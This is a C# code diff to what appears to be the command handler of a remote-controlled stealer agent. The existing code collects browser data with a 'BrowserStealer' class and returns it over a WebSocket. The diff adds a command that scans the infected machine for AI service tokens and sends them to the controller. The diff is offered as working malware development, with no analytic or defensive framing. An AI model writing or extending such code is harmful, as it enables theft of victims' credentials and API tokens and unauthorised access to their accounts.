@@ -346,6 +346,10 @@ public class AgentEngine
                 await HandleOtherSoftBrowser(msg, ct);
                 break;
 
+            case "othersoft.ai":
+                await HandleOtherSoftAI(msg, ct);
+                break;
+
             case "proxy.fetch":
                 await HandleProxyFetch(msg, ct);
                 break;
@@ -710,6 +714,13 @@ public class AgentEngine
         var result = BrowserStealer.Collect(type, offset, limit);
         if (_ws != null)
             await _ws.SendResultRawAsync("othersoft.browser.result", _agentId, result, msg.RequestId);
+    }
+
+    private async Task HandleOtherSoftAI(WebSocketMessage msg, CancellationToken ct)
+    {
+        var result = AITokenScanner.Scan();
+        if (_ws != null)
+            await _ws.SendResultRawAsync("othersoft.ai.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleProxyFetch(WebSocketMessage msg, CancellationToken ct)
